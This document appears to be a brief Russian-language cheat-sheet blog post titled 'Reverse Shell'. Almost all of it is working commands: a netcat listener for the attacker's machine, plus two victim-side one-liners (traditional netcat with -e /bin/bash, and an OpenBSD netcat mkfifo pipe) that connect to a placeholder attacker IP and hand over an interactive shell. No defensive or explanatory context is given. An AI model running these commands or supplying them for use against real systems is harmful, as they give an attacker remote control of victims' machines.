---
title: Reverse Shell
description: Используя Traditional и OpenBSD Netcat
date: 2022-12-09T15:02:00+05:00
tags: [linux, ssh, hack]
---
## Машина атакующего
```shell
nc -lvp <port>
```
## Машина жертвы (Traditional Netcat)
```shell
nc <attacker-ip> <port> -e /bin/bash
```

## Машина жертвы (OpenBSD Netcat)
```shell
mkfifo /tmp/rev; nc <attacker-ip> <port> < /tmp/rev | /bin/bash 2>&1 | tee /tmp/rev > /dev/null
```
